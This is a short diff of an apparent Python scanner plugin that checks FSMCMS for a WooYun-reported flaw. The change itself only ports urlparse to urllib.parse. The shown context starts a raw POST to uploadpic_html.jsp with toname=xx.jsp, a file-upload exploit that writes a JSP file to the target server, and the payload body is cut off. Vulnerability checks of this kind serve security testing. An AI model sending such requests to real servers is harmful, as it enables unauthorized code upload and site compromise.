@@ -2,14 +2,14 @@
 #-*- encoding:utf-8 -*-
 #__author__ = '这个程序员不太冷'
 #ref http://www.wooyun.org/bugs/wooyun-2015-0144274/
-import urlparse
+import urllib.parse
 def assign(service, arg):
     if service == "fsmcms":
         return True, arg
 
 
 def audit(arg):
-    arr=urlparse.urlparse(arg)
+    arr=urllib.parse.urlparse(arg)
     raw='''POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1
 Host: %s
 Content-Length: 69
